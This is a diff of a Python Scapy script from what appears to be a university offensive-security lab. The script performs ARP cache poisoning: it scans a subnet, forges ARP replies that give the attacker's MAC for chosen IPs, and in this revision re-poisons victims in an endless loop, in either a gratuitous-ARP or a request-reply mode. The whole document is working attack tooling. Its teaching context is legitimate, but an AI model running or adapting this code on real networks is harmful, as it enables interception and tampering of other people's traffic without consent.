@@ -1,10 +1,11 @@
 from scapy.all import * 
+import time
 
 print ( '\033[95m' +"        2IC80 Lab on offensive computer security        ")
 print ( '\033[95m' +"                Group 44 2021/2022 TU/e                 ")
 print ( '\033[0m'  +"--------------------------------------------------------")
 
-def spoofedPkt(macVictim, ipVictim, ipToSpoof):
+def spoofedPkt(macVictim, ipVictim, ipToSpoof, interface):
     arp= Ether() / ARP()
     arp[Ether].src = macAttacker
     arp[ARP].hwsrc = macAttacker        
@@ -12,9 +13,9 @@ def spoofedPkt(macVictim, ipVictim, ipToSpoof):
     arp[ARP].hwdst = macVictim
     arp[ARP].pdst = ipVictim           
 
-    sendp(arp, inter = 60, loop = 1, iface="enp0s9") # inter -> 60 sec to wait between 2 pkts
+    sendp(arp, loop = 0, iface=interface) # inter -> 60 sec to wait between 2 pkts
 
-def gratutiousARP(macVictim, ipVictim, ipToSpoof):
+def gratutiousARP(macVictim, ipVictim, ipToSpoof, interface):
     #arp response that was not prompt by arp request
     arp= Ether() / ARP()
     arp[Ether].src = macAttacker
@@ -25,11 +26,9 @@ def gratutiousARP(macVictim, ipVictim, ipToSpoof):
     arp[ARP].op = "is-at"
     print("MacVictim: ", macVictim)
     
-    sendp(arp, inter = 60, loop = 1, iface="enp0s9") # inter -> 60 sec to wait between 2 pkts
-    
+    sendp(arp, loop = 0, iface=interface) # inter -> 60 sec to wait between 2 pkts inter = 60, loop = 1,
 
-#ping all host with IPs between 192.168.56.99-103
-#hosts = sr(IP(dst = "192.168.56.100/30")/ICMP(), timeout=2) 
+interface = raw_input("Input interface, for example enp0s9: ")  
 
 hosts = arping("10.0.2.0/24") #checks which IPs in the range: 192.168.56.100-108 are up
 dictIPMAC = {}
@@ -53,16 +52,19 @@ for i in range(inputNumber):
 
 print("You want to poision the arp tables of ", ipVictims)
 
+# print("You want to poision the arp tables of ", ipVictims)
+mode = raw_input("Input silent for gratutions poisoning or all-out for request-reply: ")
 #shouldn't we make this automatic to make it work on multiple systems?
 macAttacker = "08:00:27:96:ae:0b"            
 ipAttacker = "10.0.2.5"
 
-for i in range(len(ipVictims)):
-    macVictim = dictIPMAC[ipVictims[i]]
-    ipVictim = ipVictims[i]
-    ipToSpoof = ipsToBeSpoofed[i]
-    #spoofedPkt(macVictim, ipVictim, ipToSpoof)
-    # gratutiousARP(macVictim, ipVictim, ipToSpoof)
-    spoofedPkt(macVictim, ipVictim, ipToSpoof)
-
-#print("ARP poisoning of: " + ipVictims + " complete!")
+while True:
+    for i in range(len(ipVictims)):
+        macVictim = dictIPMAC[ipVictims[i]]
+        ipVictim = ipVictims[i]
+        ipToSpoof = ipsToBeSpoofed[i]
+        if mode == "silent":
+            gratutiousARP(macVictim, ipVictim, ipToSpoof, interface)
+        else:    
+            spoofedPkt(macVictim, ipVictim, ipToSpoof, interface)
+    time.sleep(30)    
